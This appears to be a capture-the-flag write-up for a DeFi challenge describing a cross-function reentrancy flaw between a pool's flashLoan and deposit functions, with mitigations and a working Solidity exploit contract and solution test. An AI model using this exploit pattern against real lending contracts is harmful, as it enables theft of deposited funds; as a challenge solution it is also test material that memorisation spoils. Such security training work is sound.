## Cross-function reentrancy between `flashloan` and `deposit` function

the `execute` callback on `flashLoan` can reenter the system by calling `deposit` to register the borrowed funds under the name of the caller, who can posteriorly withdraw such funds. 
The flashLoan will not revert because it is expecting its own balance to be the same at the start and end of the transaction, no matter the how (through direct ETH transaction or through deposit function). 

### Recommended mitigation
- Use reentrancy guards on deposit and withdraw function.
- Use transferFrom to recover the funds instead of waiting for the borrower to transfer them back. 


### PoC
The borrower contract:
```solidity
contract Borrower is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;
    
    constructor (SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    // 1. Request the flash loan
    function igniteFlashLoan() public {
        pool.flashLoan(address(pool).balance);
    }
    // 2. The pool will trigger the execute call back, that reenter to deposit the borrowed funds
    function execute() payable external {
        pool.deposit{ value:msg.value }();
    }

    // 3. Withdraw the funds
    function recover() public {
        pool.withdraw();
    }

    // 4. When receive transfer it to the recovery account
    receive() external payable {
        recovery.call{ value: msg.value }('');
    }
}
```

Then use it on solution testcase:
```solidity
    function test_sideEntrance() public 
    checkSolvedByPlayer 
    {
        Borrower borrower = new Borrower(pool, recovery);
        borrower.igniteFlashLoan();   
        borrower.recover();
    }
```